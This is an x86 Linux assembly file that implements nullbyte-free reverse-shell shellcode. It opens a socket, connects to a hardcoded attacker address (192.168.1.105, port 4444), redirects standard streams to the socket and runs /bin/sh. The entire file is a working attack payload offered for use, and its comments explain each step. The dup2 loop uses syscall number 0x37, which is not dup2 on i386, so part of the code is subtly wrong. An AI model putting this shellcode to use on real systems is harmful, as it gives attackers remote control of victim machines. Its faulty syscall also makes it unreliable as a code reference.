; Author: GinVlad
; Reverse_shell_asm.asm

global _start

section .text
_start:
	
	; Make not \00 register
	xor eax, eax
	mov ebx, eax
	mov esi, eax

	; Create socket
	mov al, 0x66	; SYS_SOCKETCALL = 102
	mov bl, 0x1		; socket() for 1st argument of socketcall
	; create arguments for socket(AF_INET, SOCK_STREAM, 0)
	push esi		; 3rd arg
	push ebx		; 2nd arg = SOCK_STREAM == 1
	push 0x2		; 1st arg = AF_INET == 2
	mov ecx, esp	; 2 sd arg of socketcall
	int 0x80		; call syscall
	mov edx, eax	; store sockfd

	; Create connect(sockfd, (struct sockaddr *) &serv_addr, sizeof(struct sockaddr));
	mov al, 0x66
	mov bl, 0x3		; connect == 3
	; Create (struct sockaddr *) &serv_addr
	; serv_addr.sin_family = AF_INET;
	; serv_addr.sin_port = htons(port);
	; serv_addr.sin_addr.s_addr = inet_addr("192.168.1.105"); /* Attacker address */
	push dword 0x6901a8c0	; inet_addr("192.168.1.105"). socket.inet_aton('192.168.1.105')[::-1].encode('hex')
	push word 0x5c11		; port = 4444. struct.pack("!H", socket.htons(4444)).encode('hex')
	push word 0x2			; AF_INET == 2
	mov ecx, esp			; store address of struct to ecx
	; Arguments for connect
	push 0x10		; 16 bytes of sizeof
	push ecx		; Address of struct serv_addr
	push edx		; return of sockfd
	mov ecx, esp	; store arguments of connect. socketcall(connect(arg1,arg2,arg3))
	int 0x80		; call syscall

	; dup2
	mov ebx, edx	; sockfd return
	xor ecx, ecx
	mov cl, 0x2		; loop 0-2

loop_dup2:
	mov al, 0x37	; sys_dup2
	int 0x80		; call syscall
	dec ecx			; ecx--
	jns loop_dup2	; jump if not zero

	; char *argv[] = {"/bin//sh", NULL}; /*Create pointer have address*/
	; execve(argv[0], &argv[0], 0); /*Call execve*/
	push esi				; NULL of args[]
	push dword 0x68732f2f	; //sh
	push dword 0x6e69622f	; /bin
	mov ebx, esp			; store addres argv[] to ebx. Argument 1
	mov al, 0xb				; sys_execve is 11
	mov ecx, esi			; Argument 2 = 0
	mov edx, esi			; Argument 3 = 0
	int 0x80				; call syscall